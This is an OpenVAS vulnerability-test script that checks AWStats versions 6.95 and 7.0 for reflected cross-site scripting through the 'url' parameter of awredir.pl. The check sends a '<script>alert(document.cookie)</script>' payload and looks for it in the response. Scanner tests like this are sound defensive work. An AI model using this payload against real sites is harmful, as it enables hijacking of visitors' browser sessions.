###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_awstats_awredir_mult_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# AWStats 'awredir.pl' Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:awstats:awstats";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802251");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-10-04 16:55:13 +0200 (Tue, 04 Oct 2011)");
  script_bugtraq_id(49749);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("AWStats 'awredir.pl' Multiple Cross-Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://websecurity.com.ua/5380/");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46160");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/105307/awstats-sqlxsssplit.txt");

  script_tag(name:"qod_type", value:"remote_vul");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("awstats_detect.nasl");
  script_mandatory_keys("awstats/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"AWStats version 6.95 and 7.0");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied input via the
'url' and 'key' parameters to awredir.pl, which allows attackers to execute arbitrary HTML and script code in a
user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to version 7.1 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"This host is running AWStats and is prone to multiple cross site scripting
vulnerabilities.");

  script_xref(name:"URL", value:"http://awstats.sourceforge.net");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/awredir.pl?url=<script>alert(document.cookie)</script>";

if (http_vuln_check(port: port, url: url, check_header: TRUE,
                    pattern: "<script>alert\(document.cookie\)</script>")) {
  report = report_vuln_url(url: url, port: port);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
